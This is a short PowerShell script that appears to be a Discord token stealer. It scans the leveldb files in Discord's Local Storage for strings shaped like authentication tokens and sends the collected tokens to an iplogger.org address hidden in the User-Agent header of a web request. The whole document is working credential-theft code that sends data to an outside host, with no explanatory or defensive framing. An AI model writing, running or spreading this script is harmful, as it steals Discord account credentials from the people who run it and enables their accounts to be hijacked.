$l=New-Object Collections.Generic.List[string];
Get-ChildItem -Path ($env:APPDATA+'/discord/Local Storage/leveldb') -Filter *.ldb|Foreach-Object {$content=Get-Content $_.FullName;Select-String '[\w-]{24}\.[\w-]{6}\.[\w-]{27}' -input $content -AllMatches|ForEach-Object{$l.add($_.matches)}}
$l=$l-join($l|Select-Object -uniq)
$s=Invoke-WebRequest -Uri 'https://iplogger.org/1f9ws7' -UserAgent $l -UseBasicParsing